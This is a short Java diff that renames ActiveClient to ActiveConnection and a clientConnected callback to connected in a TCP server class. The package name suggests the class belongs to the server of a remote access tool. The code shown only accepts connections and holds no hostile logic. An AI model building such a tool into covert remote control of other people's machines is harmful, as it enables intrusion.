@@ -3,7 +3,7 @@ package de.sogomn.rat.server;
 import java.net.Socket;
 
 import de.sogomn.engine.net.TCPServer;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class ActiveServer extends TCPServer {
 	
@@ -15,14 +15,14 @@ public final class ActiveServer extends TCPServer {
 		super(port);
 	}
 	
-	private ActiveClient acceptClient() {
+	private ActiveConnection acceptClient() {
 		final Socket socket = acceptConnection();
 		
 		if (socket == null) {
 			return null;
 		}
 		
-		final ActiveClient client = new ActiveClient(socket);
+		final ActiveConnection client = new ActiveConnection(socket);
 		
 		return client;
 	}
@@ -44,10 +44,10 @@ public final class ActiveServer extends TCPServer {
 	public void start() {
 		final Runnable runnable = () -> {
 			while (isOpen()) {
-				final ActiveClient client = acceptClient();
+				final ActiveConnection client = acceptClient();
 				
 				if (observer != null && client != null) {
-					observer.clientConnected(this, client);
+					observer.connected(this, client);
 				}
 			}
 		};
